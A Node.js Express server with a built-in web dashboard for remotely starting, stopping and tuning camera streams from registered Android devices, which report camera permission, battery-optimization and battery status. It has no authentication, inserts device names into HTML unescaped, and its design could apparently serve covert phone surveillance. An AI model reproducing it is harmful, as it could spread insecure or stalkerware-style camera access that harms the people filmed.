const express = require('express');
const http = require('http');
const cors = require('cors');

const app = express();
const server = http.createServer(app);

app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

let devices = [];
let deviceHeartbeats = {};
let pendingCommands = {};
let latestFrames = {};
let globalSettings = { stream: false, quality: 240, fps: 15 };

// Cleanup stale devices every 30s
setInterval(() => {
    const now = Date.now();
    const before = devices.length;
    devices = devices.filter(device => {
        if (now - (deviceHeartbeats[device.id] || 0) > 60000) {
            console.log(`🧹 Removing stale device: ${device.name}`);
            delete deviceHeartbeats[device.id];
            delete pendingCommands[device.id];
            delete latestFrames[device.id];
            return false;
        }
        return true;
    });
    if (devices.length !== before) console.log(`📱 Devices now: ${devices.length}`);
}, 30000);

// ========== API ENDPOINTS ==========

// Device heartbeat (register)
app.post('/api/heartbeat', (req, res) => {
    try {
        const { deviceId, deviceName, camera, cameraReady, streaming, cameraPermission, batteryOptimization, batteryPercentage } = req.body;

        deviceHeartbeats[deviceId] = Date.now();

        let device = devices.find(d => d.id === deviceId);
        if (!device) {
            device = { id: deviceId, name: deviceName || 'Android Device', connectedAt: new Date().toLocaleTimeString(), firstSeen: Date.now() };
            devices.push(device);
            console.log(`✅ Device registered: ${device.name} (${deviceId})`);
        }

        device.name = deviceName || device.name;
        device.camera = camera || device.camera;
        device.cameraReady = cameraReady;
        device.streaming = streaming;
        device.cameraPermission = cameraPermission;
        device.batteryOptimization = batteryOptimization;
        device.batteryPercentage = batteryPercentage || 0;
        device.lastHeartbeat = new Date().toLocaleTimeString();
        device.lastSeen = Date.now();

        res.json({ success: true, settings: globalSettings });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// Device uploads frame
app.post('/api/frame', (req, res) => {
    try {
        const { deviceId, image, quality, fps, camera } = req.body;
        if (deviceId && image && globalSettings.stream) {
            latestFrames[deviceId] = { image, ts: Date.now(), quality, fps, camera };
        }
        res.json({ success: true });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// Browser fetches frame
app.get('/api/frame/:deviceId', (req, res) => {
    const frame = latestFrames[req.params.deviceId];
    if (!frame) return res.json({ success: false, image: null });
    res.json({ success: true, image: frame.image, ts: frame.ts });
});

// Send command to device
app.post('/api/command', (req, res) => {
    try {
        const { deviceId, command, value } = req.body;

        console.log(`📡 Command: ${command} for ${deviceId}`);

        switch (command) {
            case 'start': globalSettings.stream = true; break;
            case 'stop': globalSettings.stream = false; break;
            case 'quality': globalSettings.quality = value; break;
            case 'fps': globalSettings.fps = value; break;
        }

        const cmd = { command, value: value ?? null };

        if (!pendingCommands[deviceId]) pendingCommands[deviceId] = [];
        pendingCommands[deviceId].push(cmd);

        res.json({ success: true, settings: globalSettings });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// Device polls commands
app.get('/api/commands/:deviceId', (req, res) => {
    try {
        const { deviceId } = req.params;

        deviceHeartbeats[deviceId] = Date.now();
        if (!devices.find(d => d.id === deviceId)) {
            devices.push({ id: deviceId, name: deviceId, connectedAt: new Date().toLocaleTimeString(), firstSeen: Date.now(), lastHeartbeat: new Date().toLocaleTimeString() });
            console.log(`📱 Auto-registered: ${deviceId}`);
        }

        const cmds = pendingCommands[deviceId] || [];
        pendingCommands[deviceId] = [];

        if (cmds.length > 0) console.log(`✅ Delivered ${cmds.length} cmd(s) to ${deviceId}: ${cmds.map(c => c.command).join(', ')}`);

        res.json({ success: true, settings: globalSettings, commands: cmds });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// Device status update
app.post('/api/device-status', (req, res) => {
    try {
        const { deviceId, deviceName, cameraReady, streaming, cameraType, cameraPermission, status } = req.body;
        let device = devices.find(d => d.id === deviceId);
        if (device) {
            device.cameraReady = cameraReady ?? device.cameraReady;
            device.streaming = streaming ?? device.streaming;
            device.camera = cameraType || device.camera;
            device.cameraPermission = cameraPermission ?? device.cameraPermission;
            device.status = status;
            device.lastUpdate = new Date().toLocaleTimeString();
        }
        res.json({ success: true });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// Get all devices
app.get('/api/devices', (req, res) => {
    const now = Date.now();
    res.json({ success: true, devices: devices.map(d => ({
        id: d.id, name: d.name, camera: d.camera || 'back',
        cameraReady: d.cameraReady || false, streaming: d.streaming || false,
        cameraPermission: d.cameraPermission || false,
        batteryOptimization: d.batteryOptimization || false,
        batteryPercentage: d.batteryPercentage || 0,
        isConnected: (now - (deviceHeartbeats[d.id] || 0)) < 15000,
        lastHeartbeat: d.lastHeartbeat, connectedAt: d.connectedAt
    }))});
});

// Get single device
app.get('/api/device/:deviceId', (req, res) => {
    const device = devices.find(d => d.id === req.params.deviceId);
    if (!device) return res.status(404).json({ success: false, error: 'Not found' });
    const now = Date.now();
    res.json({ success: true, device: { ...device, isConnected: (now - (deviceHeartbeats[device.id] || 0)) < 15000 } });
});

// Get settings
app.get('/api/settings', (req, res) => res.json({ success: true, settings: globalSettings }));

// Health check
app.get('/api/health', (req, res) => res.json({ status: 'ok', devices: devices.length, streaming: globalSettings.stream, quality: globalSettings.quality, fps: globalSettings.fps, uptime: process.uptime() }));

app.get('/favicon.ico', (req, res) => res.status(204).end());

// ========== WEB INTERFACE ==========
app.get('/', (req, res) => {
    res.send(`<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Ludoo Camera Remote</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif; background:#0a0a0a; min-height:100vh; padding:20px; color:#fff; }
        .container { max-width:600px; margin:0 auto; }
        .header { text-align:center; margin-bottom:20px; }
        .header h1 { font-size:24px; background:linear-gradient(135deg,#667eea,#764ba2); -webkit-background-clip:text; -webkit-text-fill-color:transparent; }
        .header p { font-size:12px; color:#666; margin-top:5px; }
        .stats { display:grid; grid-template-columns:repeat(3,1fr); gap:12px; margin-bottom:20px; }
        .stat-card { background:#1a1a1a; border-radius:12px; padding:12px; text-align:center; border:1px solid #2a2a2a; }
        .stat-label { font-size:11px; color:#888; margin-bottom:5px; }
        .stat-value { font-size:20px; font-weight:700; }
        .stat-value.online { color:#4CAF50; }
        @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.6} }
        .video-container { background:#000; border-radius:16px; overflow:hidden; aspect-ratio:16/9; margin-bottom:20px; border:1px solid #2a2a2a; display:flex; align-items:center; justify-content:center; position:relative; }
        #video { width:100%; height:100%; object-fit:cover; display:none; }
        .video-placeholder { text-align:center; color:#555; }
        .video-placeholder span { font-size:48px; }
        .disconnected-overlay { display:none; position:absolute; top:0; left:0; right:0; bottom:0; background:rgba(0,0,0,.55); align-items:center; justify-content:center; flex-direction:column; gap:8px; z-index:5; pointer-events:none; }
        .disconnected-overlay.show { display:flex; }
        .disconnected-overlay span { font-size:13px; color:#f44336; font-weight:600; letter-spacing:1px; }
        .expand-btn { position:absolute; bottom:12px; right:12px; background:rgba(0,0,0,.6); border:none; color:white; font-size:18px; width:36px; height:36px; border-radius:50%; cursor:pointer; z-index:10; transition:all .2s; display:flex; align-items:center; justify-content:center; }
        .expand-btn:hover { background:rgba(102,126,234,.8); transform:scale(1.05); }
        .video-overlay { display:none; position:fixed; top:0; left:0; right:0; bottom:0; background:rgba(0,0,0,.92); z-index:2000; align-items:center; justify-content:center; }
        .video-overlay.active { display:flex; }
        .overlay-video-wrap { position:relative; overflow:hidden; border-radius:12px; touch-action:none; user-select:none; min-width:120px; min-height:80px; }
        #overlayVideo { display:block; width:100%; height:100%; object-fit:contain; transform-origin:center center; pointer-events:none; }
        .overlay-corner-btn { position:absolute; top:10px; z-index:10; background:rgba(0,0,0,.65); border:1px solid rgba(255,255,255,.18); color:#fff; font-size:13px; padding:7px 13px; border-radius:20px; cursor:pointer; backdrop-filter:blur(4px); transition:all .2s; display:flex; align-items:center; gap:5px; white-space:nowrap; }
        .overlay-corner-btn:hover { background:rgba(102,126,234,.85); border-color:#667eea; }
        .overlay-corner-btn.rotate-btn { left:10px; }
        .overlay-corner-btn.close-btn { right:10px; border-color:rgba(244,67,54,.5); color:#ff6b6b; }
        .overlay-corner-btn.close-btn:hover { background:rgba(244,67,54,.85); color:#fff; border-color:#f44336; }
        .overlay-resize-handle { position:absolute; bottom:0; right:0; width:28px; height:28px; cursor:nwse-resize; z-index:11; display:flex; align-items:flex-end; justify-content:flex-end; padding:4px; }
        .overlay-resize-handle::after { content:''; display:block; width:14px; height:14px; border-right:3px solid rgba(255,255,255,.45); border-bottom:3px solid rgba(255,255,255,.45); border-radius:2px; }
        .controls { background:#1a1a1a; border-radius:16px; padding:16px; margin-bottom:20px; border:1px solid #2a2a2a; }
        .section-title { font-size:12px; color:#888; margin-bottom:12px; letter-spacing:1px; }
        .button-group { display:flex; gap:12px; margin-bottom:20px; flex-wrap:wrap; }
        .btn { padding:12px 20px; border:none; border-radius:12px; font-size:14px; font-weight:600; cursor:pointer; transition:all .2s; }
        .btn-start { background:#4CAF50; color:white; } .btn-start:hover { background:#45a049; }
        .btn-stop { background:#f44336; color:white; } .btn-stop:hover { background:#da190b; }
        .btn-flip { background:#2196F3; color:white; } .btn-flip:hover { background:#0b7dda; }
        .quality-grid { display:grid; grid-template-columns:repeat(4,1fr); gap:8px; margin-bottom:20px; }
        .quality-btn { padding:10px; border:1px solid #2a2a2a; background:#0a0a0a; color:#fff; border-radius:10px; cursor:pointer; font-size:12px; text-align:center; }
        .quality-btn.active { background:#667eea; border-color:#667eea; }
        .fps-control { margin-top:16px; }
        .fps-slider { width:100%; height:4px; -webkit-appearance:none; background:#2a2a2a; border-radius:2px; margin:10px 0; }
        .fps-slider::-webkit-slider-thumb { -webkit-appearance:none; width:16px; height:16px; background:#667eea; border-radius:50%; cursor:pointer; }
        .fps-value { text-align:center; font-size:12px; color:#888; }
        .devices { background:#1a1a1a; border-radius:16px; padding:16px; border:1px solid #2a2a2a; }
        .device-item { display:flex; justify-content:space-between; align-items:center; padding:12px 10px; cursor:pointer; transition:background .2s; border-radius:8px; margin:2px 0; }
        .device-item:hover { background:#252525; }
        .device-item.selected { background:#1e1e3a; border:1px solid #667eea; }
        .device-name { font-size:14px; font-weight:500; }
        .device-status-dot { width:10px; height:10px; border-radius:50%; margin-left:10px; }
        .status-connected { background:#4CAF50; box-shadow:0 0 5px #4CAF50; }
        .empty-devices { text-align:center; color:#555; padding:20px; }
        .status-modal { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,.85); z-index:1000; justify-content:center; align-items:center; }
        .status-modal-content { background:#1a1a1a; border-radius:20px; width:90%; max-width:350px; padding:20px; border:1px solid #667eea; }
        .status-modal-header { display:flex; justify-content:space-between; align-items:center; margin-bottom:16px; padding-bottom:12px; border-bottom:1px solid #2a2a2a; }
        .status-modal-title { font-size:18px; font-weight:600; }
        .status-modal-close { background:none; border:none; color:#888; font-size:24px; cursor:pointer; }
        .status-item { display:flex; justify-content:space-between; align-items:center; padding:10px 0; border-bottom:1px solid #2a2a2a; font-size:14px; }
        .status-item:last-child { border-bottom:none; }
        .status-label { color:#888; }
        .status-allowed { color:#4CAF50; font-weight:600; }
        .status-denied { color:#f44336; font-weight:600; }
        .status-pending { color:#FF9800; font-weight:600; }
        .battery-bar-small { height:6px; background:#2a2a2a; border-radius:3px; overflow:hidden; width:100px; }
        .battery-fill-small { height:100%; background:linear-gradient(90deg,#4CAF50,#8BC34A); border-radius:3px; }
        .flex-row { display:flex; align-items:center; gap:10px; }
    </style>
</head>
<body>
<div class="container">
    <div class="header"><h1>📹 Ludoo Remote</h1><p>Tap on device to view status</p></div>
    <div class="stats">
        <div class="stat-card"><div class="stat-label">STATUS</div><div class="stat-value online" id="serverStatus">● Online</div></div>
        <div class="stat-card"><div class="stat-label">DEVICES</div><div class="stat-value" id="deviceCount">0</div></div>
        <div class="stat-card"><div class="stat-label">FPS</div><div class="stat-value" id="fpsCount">0</div></div>
    </div>
    <div class="video-container" id="videoContainer">
        <img id="video"><div id="placeholder" class="video-placeholder"><span>📷</span><br>Select a device first</div>
        <div class="disconnected-overlay" id="disconnectedOverlay"><span>⚠ DEVICE DISCONNECTED</span><span style="font-size:11px;color:#888;font-weight:400">Last frame frozen — waiting to reconnect...</span></div>
        <button class="expand-btn" id="expandBtn" title="Expand">⛶</button>
    </div>
    <div class="video-overlay" id="videoOverlay">
        <div class="overlay-video-wrap" id="overlayWrap">
            <img id="overlayVideo" src="" style="display:none;">
            <div id="overlayPlaceholder" class="video-placeholder" style="display:flex;align-items:center;justify-content:center;height:100%;background:#000;"><div><span style="font-size:36px;">📷</span><br>No stream</div></div>
            <button class="overlay-corner-btn rotate-btn" id="rotateBtn">🔄 Rotate</button>
            <button class="overlay-corner-btn close-btn" id="overlayCloseBtn">✕ Close</button>
            <div class="overlay-resize-handle" id="overlayResizeHandle"></div>
        </div>
    </div>
    <div class="controls">
        <div class="section-title">🎮 CONTROLS</div>
        <div class="button-group"><button class="btn btn-start" id="startBtn">▶ START</button><button class="btn btn-stop" id="stopBtn">⏹ STOP</button><button class="btn btn-flip" id="flipBtn">🔄 FLIP</button></div>
        <div class="section-title">📐 QUALITY</div>
        <div class="quality-grid"><button class="quality-btn" data-quality="120">120p</button><button class="quality-btn" data-quality="140">140p</button><button class="quality-btn active" data-quality="240">240p</button><button class="quality-btn" data-quality="360">360p</button></div>
        <div class="fps-control"><div class="section-title">⚡ FPS</div><input type="range" id="fpsSlider" min="5" max="30" value="15" step="1" class="fps-slider"><div class="fps-value" id="fpsLabel">15 FPS (Recommended)</div></div>
    </div>
    <div class="devices"><div class="section-title">📱 CONNECTED DEVICES</div><div id="devicesList"><div class="empty-devices">No devices connected</div></div></div>
</div>
<div id="statusModal" class="status-modal">
    <div class="status-modal-content"><div class="status-modal-header"><span class="status-modal-title" id="modalDeviceName">Device</span><button class="status-modal-close" onclick="closeStatusModal()">✕</button></div><div id="modalContent"></div></div>
</div>
<script>
    let selectedDeviceId = null, currentDevices = [], isStreaming = false, wasStreaming = false, frameCount = 0, lastFpsUpdate = Date.now(), framePollTimer = null, lastFrameTs = 0;
    const video = document.getElementById('video'), placeholder = document.getElementById('placeholder'), deviceCountSpan = document.getElementById('deviceCount'), fpsCountSpan = document.getElementById('fpsCount'), devicesList = document.getElementById('devicesList'), fpsSlider = document.getElementById('fpsSlider'), fpsLabel = document.getElementById('fpsLabel'), serverStatus = document.getElementById('serverStatus'), disconnectedOverlay = document.getElementById('disconnectedOverlay');
    function startFramePoll() { stopFramePoll(); let fps = parseInt(fpsSlider.value) || 15; let interval = Math.max(50, Math.round(1000 / fps)); framePollTimer = setInterval(fetchFrame, interval); }
    function stopFramePoll() { if (framePollTimer) { clearInterval(framePollTimer); framePollTimer = null; } }
    function fetchFrame() { if (!selectedDeviceId || !isStreaming) return; fetch('/api/frame/' + selectedDeviceId).then(r => r.json()).then(data => { if (data.success && data.image && data.ts > lastFrameTs) { lastFrameTs = data.ts; let src = 'data:image/jpeg;base64,' + data.image; video.src = src; video.style.display = 'block'; placeholder.style.display = 'none'; disconnectedOverlay.classList.remove('show'); wasStreaming = true; if (videoOverlay.classList.contains('active')) { overlayVideo.src = src; overlayVideo.style.display = 'block'; overlayPlaceholder.style.display = 'none'; } frameCount++; let now = Date.now(); if (now - lastFpsUpdate >= 1000) { fpsCountSpan.textContent = frameCount; frameCount = 0; lastFpsUpdate = now; } } }).catch(()=>{}); }
    function sendCommand(command, value) { if (!selectedDeviceId) { alert('Select a device first'); return; } fetch('/api/command', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ deviceId: selectedDeviceId, command: command, value: value != null ? value : null }) }).catch(()=>{}); }
    document.getElementById('startBtn').onclick = () => { sendCommand('start'); isStreaming = true; wasStreaming = false; disconnectedOverlay.classList.remove('show'); startFramePoll(); };
    document.getElementById('stopBtn').onclick = () => { sendCommand('stop'); isStreaming = false; wasStreaming = false; stopFramePoll(); video.src = ''; video.style.display = 'none'; placeholder.style.display = 'block'; disconnectedOverlay.classList.remove('show'); fpsCountSpan.textContent = '0'; };
    document.getElementById('flipBtn').onclick = () => sendCommand('flip');
    document.querySelectorAll('.quality-btn').forEach(btn => { btn.onclick = () => { document.querySelectorAll('.quality-btn').forEach(b => b.classList.remove('active')); btn.classList.add('active'); sendCommand('quality', parseInt(btn.dataset.quality)); }; });
    fpsSlider.oninput = () => { let fps = parseInt(fpsSlider.value); fpsLabel.textContent = fps + ' FPS' + (fps === 15 ? ' (Recommended)' : ''); sendCommand('fps', fps); if (isStreaming) startFramePoll(); };
    let overlayRotation = 0, overlayVideo = document.getElementById('overlayVideo'), overlayPlaceholder = document.getElementById('overlayPlaceholder'), overlayWrap = document.getElementById('overlayWrap'), videoOverlay = document.getElementById('videoOverlay');
    function setDefaultOverlaySize() { let vw = window.innerWidth, vh = window.innerHeight; let w = Math.round(vw * 0.88); let h = Math.round(w * 9 / 16); if (h > vh * 0.82) { h = Math.round(vh * 0.82); w = Math.round(h * 16 / 9); } overlayWrap.style.width = w + 'px'; overlayWrap.style.height = h + 'px'; }
    function applyOverlayTransform() { overlayVideo.style.transform = 'rotate(' + overlayRotation + 'deg)'; }
    function syncOverlayFrame() { if (video.src && video.style.display !== 'none') { overlayVideo.src = video.src; overlayVideo.style.display = 'block'; overlayPlaceholder.style.display = 'none'; } else { overlayVideo.style.display = 'none'; overlayPlaceholder.style.display = 'flex'; } applyOverlayTransform(); }
    document.getElementById('expandBtn').addEventListener('click', () => { setDefaultOverlaySize(); overlayRotation = 0; applyOverlayTransform(); videoOverlay.classList.add('active'); syncOverlayFrame(); });
    document.getElementById('overlayCloseBtn').addEventListener('click', () => videoOverlay.classList.remove('active'));
    document.getElementById('rotateBtn').addEventListener('click', () => { overlayRotation = (overlayRotation + 90) % 360; applyOverlayTransform(); });
    let isResizing = false, resizeStartX, resizeStartY, resizeStartW, resizeStartH;
    document.getElementById('overlayResizeHandle').addEventListener('mousedown', (e) => { e.preventDefault(); isResizing = true; resizeStartX = e.clientX; resizeStartY = e.clientY; resizeStartW = overlayWrap.offsetWidth; resizeStartH = overlayWrap.offsetHeight; });
    document.addEventListener('mousemove', (e) => { if (!isResizing) return; overlayWrap.style.width = Math.min(window.innerWidth-20, Math.max(160, resizeStartW + e.clientX - resizeStartX)) + 'px'; overlayWrap.style.height = Math.min(window.innerHeight-20, Math.max(100, resizeStartH + e.clientY - resizeStartY)) + 'px'; });
    document.addEventListener('mouseup', () => isResizing = false);
    function closeStatusModal() { document.getElementById('statusModal').style.display = 'none'; }
    function showDeviceStatus(device) { document.getElementById('modalDeviceName').textContent = '📱 ' + device.name; let battery = device.batteryPercentage || 0; document.getElementById('modalContent').innerHTML = '<div class="status-item"><span class="status-label">Connection</span><span class="' + (device.isConnected ? 'status-allowed' : 'status-denied') + '">' + (device.isConnected ? '● Connected' : '● Disconnected') + '</span></div><div class="status-item"><span class="status-label">Camera Permission</span><span class="' + (device.cameraPermission ? 'status-allowed' : 'status-denied') + '">' + (device.cameraPermission ? 'Allowed' : 'Denied') + '</span></div><div class="status-item"><span class="status-label">Camera Ready</span><span class="' + (device.cameraReady ? 'status-allowed' : 'status-pending') + '">' + (device.cameraReady ? 'Yes' : 'No') + '</span></div><div class="status-item"><span class="status-label">Streaming</span><span class="' + (device.streaming ? 'status-allowed' : 'status-pending') + '">' + (device.streaming ? 'Active' : 'Idle') + '</span></div><div class="status-item"><span class="status-label">Battery</span><div class="flex-row"><span>' + battery + '%</span><div class="battery-bar-small"><div class="battery-fill-small" style="width:' + battery + '%"></div></div></div></div><div class="status-item"><span class="status-label">Last Heartbeat</span><span style="color:#ccc">' + (device.lastHeartbeat || 'N/A') + '</span></div>'; document.getElementById('statusModal').style.display = 'flex'; }
    function selectDevice(deviceId, showModal) { selectedDeviceId = deviceId; wasStreaming = false; isStreaming = false; stopFramePoll(); disconnectedOverlay.classList.remove('show'); video.src = ''; video.style.display = 'none'; placeholder.textContent = 'Press START to stream'; placeholder.style.display = 'block'; fpsCountSpan.textContent = '0'; renderDeviceList(); if (showModal) { let device = currentDevices.find(d => d.id === deviceId); if (device) showDeviceStatus(device); } }
    function renderDeviceList() { let connected = currentDevices.filter(d => d.isConnected); deviceCountSpan.textContent = connected.length; if (connected.length === 0) { devicesList.innerHTML = '<div class="empty-devices">No devices connected</div>'; return; } devicesList.innerHTML = connected.map(d => '<div class="device-item' + (d.id === selectedDeviceId ? ' selected' : '') + '" data-deviceid="' + d.id + '"><span class="device-name">📱 ' + d.name + '</span><div class="device-status-dot status-connected"></div></div>').join(''); devicesList.querySelectorAll('.device-item').forEach(item => item.addEventListener('click', () => selectDevice(item.getAttribute('data-deviceid'), true))); }
    function checkSelectedDeviceStatus(deviceList) { if (!selectedDeviceId) return; let sel = deviceList.find(d => d.id === selectedDeviceId); if (sel && !sel.isConnected && isStreaming) { wasStreaming = true; stopFramePoll(); disconnectedOverlay.classList.add('show'); fpsCountSpan.textContent = '0'; } else if (sel && sel.isConnected && wasStreaming && !isStreaming) { wasStreaming = false; isStreaming = true; disconnectedOverlay.classList.remove('show'); sendCommand('start'); startFramePoll(); } }
    async function fetchDevices() { try { let res = await fetch('/api/devices'); let data = await res.json(); if (data.success) { currentDevices = data.devices; if (!selectedDeviceId) { let oppo = currentDevices.find(d => d.isConnected && d.id.toUpperCase().includes('OPPO')); if (oppo) { selectDevice(oppo.id, false); return; } } checkSelectedDeviceStatus(currentDevices); renderDeviceList(); } } catch(e) {} }
    fetchDevices(); setInterval(fetchDevices, 3000);
</script>
</body>
</html>`);
});

const PORT = process.env.PORT || 5000;
server.listen(PORT, '0.0.0.0', () => {
    console.log('');
    console.log('═══════════════════════════════════════════════════');
    console.log('✅  Ludoo Camera Remote  —  Pure HTTP Mode');
    console.log('═══════════════════════════════════════════════════');
    console.log('🌐  Web UI  : http://localhost:' + PORT);
    console.log('❤️   Heartbeat: POST /api/heartbeat');
    console.log('📡  Commands : POST /api/command');
    console.log('⚡  Poll cmd : GET  /api/commands/:deviceId');
    console.log('🎞️   Frame up : POST /api/frame');
    console.log('🖼️   Frame get: GET  /api/frame/:deviceId');
    console.log('📱  Devices : GET  /api/devices');
    console.log('═══════════════════════════════════════════════════');
    console.log('');
});
